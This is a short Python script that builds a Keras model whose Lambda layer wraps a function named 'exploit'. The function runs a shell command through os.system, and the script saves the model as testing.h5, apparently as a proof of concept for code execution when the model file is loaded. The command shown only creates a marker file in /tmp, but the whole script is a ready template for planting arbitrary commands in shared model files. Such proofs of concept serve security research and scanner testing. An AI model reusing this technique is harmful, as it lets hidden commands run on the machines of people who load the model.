import tensorflow as tf

def exploit(x):
    import os
    os.system("touch /tmp/done.txt")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("testing.h5")
